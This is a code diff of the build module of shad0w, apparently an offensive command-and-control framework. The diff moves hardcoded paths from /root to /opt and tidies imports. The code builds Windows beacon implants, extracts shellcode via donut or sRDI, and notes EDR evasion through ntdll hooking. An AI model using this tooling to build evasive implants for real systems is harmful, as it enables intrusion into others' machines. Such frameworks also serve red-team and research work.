@@ -1,14 +1,13 @@
-import os
-import re
-import pefile
 import base64
-import string
+import os
+import pefile
 import random
-
+import re
+import string
 from lib import shellcode
 
 # warnings to the user about the module they are using
-secure_warning = """The secure payload makes heavy use of new windows features and ntdll api hooking.
+secure_warning = """\nThe secure payload makes heavy use of new windows features and ntdll api hooking.
 This can make the payload a lot more resistant to EDR products but can also make it more unstable.
 Its been tested on:
     -   x64 Windows 8.1, x64 Windows 10 (Pro & Enterprise)
@@ -19,7 +18,7 @@ static_warning = """Static payloads can be very large and much easier to detect.
 For use in droppers, loaders, exploits etc staged payloads are recommended as they are much smaller, so easier to use.
 """
 
-def clone_source_files(rootdir="src", builddir="build", basedir="/root/shad0w/beacon", asm=False, backmake=False):
+def clone_source_files(rootdir="src", builddir="build", basedir="/opt/shad0w/beacon", asm=False, backmake=False):
     # move the source files of the beacon over
     # to the build directory
 
@@ -43,7 +42,7 @@ def update_settings_file(shad0wbuild, custom_template=None, custom_path=None):
 
     # this is hardcoded so will need docker
     if custom_path == None:
-        settings_path = "/root/shad0w/beacon/build/settings.h"
+        settings_path = "/opt/shad0w/beacon/build/settings.h"
     elif custom_path != None:
         settings_path = custom_path
 
@@ -106,13 +105,13 @@ def _crypt_strings():
 
 
 
-def make_in_clone(arch=None, platform=None, secure=None, static=None, builddir=None, modlocation="/root/shad0w/beacon/beacon.exe", debug=False, make_target=None):
+def make_in_clone(arch=None, platform=None, secure=None, static=None, builddir=None, modlocation="/opt/shad0w/beacon/beacon.exe", debug=False, make_target=None):
     # build the beacon from the source files, making sure to
     # obey the correct payload settings that we have been given
 
     # builddir should only be none when we are building a beacon
     if builddir is None:
-        builddir = "/root/shad0w/beacon/build"
+        builddir = "/opt/shad0w/beacon/build"
 
     # build the compile time args
     compile_args = ""
@@ -163,7 +162,7 @@ def make_in_clone(arch=None, platform=None, secure=None, static=None, builddir=N
 
     return True
 
-def extract_shellcode(beacon_file="/root/shad0w/beacon/beacon.exe", want_base64=False, donut=True, srdi=False):
+def extract_shellcode(beacon_file="/opt/shad0w/beacon/beacon.exe", want_base64=False, donut=True, srdi=False):
     # use donut or srdi to extract the shellcode from
     # our newly created beacon
 
@@ -200,12 +199,12 @@ def write_and_bridge(filename, rcode, noremove=False):
     # by the user and then make sure they can access it
 
     # might change this?
-    os.chdir("/root/shad0w/.bridge")
+    os.chdir("/opt/shad0w/.bridge")
 
     # remove the old beacon file, this wont always be the name though
     try:
-        if not noremove: os.unlink("/root/shad0w/beacon/beacon.exe")
-        if not noremove: os.unlink("/root/shad0w/beacon/beacon.dll")
+        if not noremove: os.unlink("/opt/shad0w/beacon/beacon.exe")
+        if not noremove: os.unlink("/opt/shad0w/beacon/beacon.dll")
     except FileNotFoundError: pass
 
     with open(filename, 'wb') as file:
@@ -376,7 +375,7 @@ def elevate_build_stage(shad0w, rootdir=None, os=None, arch=None, secure=None, f
         if format == "raw":
             rcode = extract_shellcode()
         elif format == "exe":
-            with open("/root/shad0w/beacon/beacon.exe", "rb") as file:
+            with open("/opt/shad0w/beacon/beacon.exe", "rb") as file:
                 rcode = file.read()
 
     # convert the shellcode to C array
